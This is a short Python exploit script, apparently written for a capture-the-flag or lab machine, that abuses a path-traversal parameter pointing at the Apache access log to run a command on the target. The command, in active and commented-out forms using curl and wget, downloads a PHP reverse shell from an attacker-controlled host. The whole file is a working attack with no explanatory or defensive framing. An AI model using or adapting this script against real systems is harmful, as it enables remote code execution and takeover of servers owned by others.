#!/usr/bin/python3

import requests
import base64
import re

url = 'http://10.10.244.141/'
# shell = 'wget http://10.11.7.208:8000/php-reverse-shell.php -O /dev/shm/rev_shell.php'
# shell = 'ls /dev/shm'
shell = 'curl http://10.11.7.208:8000/php-reverse-shell.php -o shell.php'
# with open('php-reverse-shell.php') as handler:
# 	lines = handler.readlines()

# print(lines)

params = {
	'view' : 'dog/../../../../var/log/apache2/access.log',
	'ext' : "",
	'c' : shell
}

resp = requests.get(url, params=params)
# print(resp.text)